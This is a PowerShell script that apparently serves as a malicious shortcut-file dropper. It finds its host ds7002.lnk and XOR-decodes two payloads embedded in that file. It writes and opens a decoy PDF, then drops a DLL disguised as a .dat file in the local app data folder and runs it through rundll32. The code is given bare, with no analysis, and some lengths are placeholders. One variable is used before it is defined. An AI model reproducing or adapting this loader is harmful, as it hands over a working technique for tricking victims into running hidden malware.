$filename = "ds7002.lnk";
$key = [System.Text.Encoding]::UTF8.GetBytes('a')[0];

$pdf_start_byte = 0x00003000;
$pdf_filelength = 0000;
$dll_start_byte = 0x00030000;
$dll_filelength = 0000;

$pdf_file = "$env:temp\ds7002.PDF";
$dll_file = "$env:localappdata\cyzfc.dat";
$dll_entrypoint = "DLLMain"

$pdf_end_byte = $dll_start_byte + $pdf_filelength;
$dll_end_byte = $dll_end_byte + $dll_filelength;

function get_directory {

    param (
        $filename
    )

    if (-not(Test-Path $filename))
    {
        $file_directory = Get-ChildItem -Path $Env:temp -Filter $filename -Recurse;
        if (-not $file_directory)
        {
            exit;
        }
        return $file_directory.DirectoryName;
    }
    return $(pwd).Path;
};

function get_filestream {

    param (
        $filename,
        $directory
    )

    [IO.Directory]::SetCurrentDirectory($directory);
    $filestream = New-Object IO.FileStream $filename,'Open','Read','ReadWrite';
    return $filestream;
};

function get_data_from_file {

    param (
        $filestream,
        $start_byte,
        $filelength
    )

    $bytearray = New-Object byte[]($filelength);
    $r = $filestream.Seek($start_byte,[IO.SeekOrigin]::Begin);
    $r = $filestream.Read($bytearray,0,$filelength);
    return $bytearray;
};

function xor_decode {

    param (
        $b,
        $l,
        $k
    )

    for($i = 0; $i -lt $l; $i++)
    {
        $b[$i] = $b[$i] -bxor $k;
    };
};

function extract_and_write_file {

    param (
        $filestream,
        $start_byte,
        $filelength,
        $outfilename,
        $key
    )

    $bytearray = get_data_from_file $filestream $start_byte $filelength;
    xor_decode $bytearray $filelength $key;
    [IO.File]::WriteAllBytes($outfilename, $bytearray);
};

$lnk_directory = get_directory $filename;
$filestream = get_filestream $filename $lnk_directory;
extract_and_write_file $filestream $pdf_start_byte $pdf_filelength $pdf_file $key;
Invoke-Item $pdf_file;
extract_and_write_file $filestream $dll_start_byte $dll_filelength $dll_file $key;
if($ENV:PROCESSOR_ARCHITECTURE -eq $("AMD64"))
{
    & ($("rundll32.exe")) $dll_file $(",") $dll_entrypoint
}
$filestream.Close();